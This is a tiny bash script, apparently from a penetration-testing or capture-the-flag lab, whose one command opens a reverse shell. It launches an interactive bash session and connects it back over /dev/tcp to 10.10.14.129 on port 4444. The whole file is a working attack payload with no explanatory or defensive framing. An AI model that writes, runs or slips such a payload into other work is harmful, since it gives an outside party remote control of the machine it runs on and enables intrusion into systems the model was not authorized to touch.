#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.129/4444 0>&1"
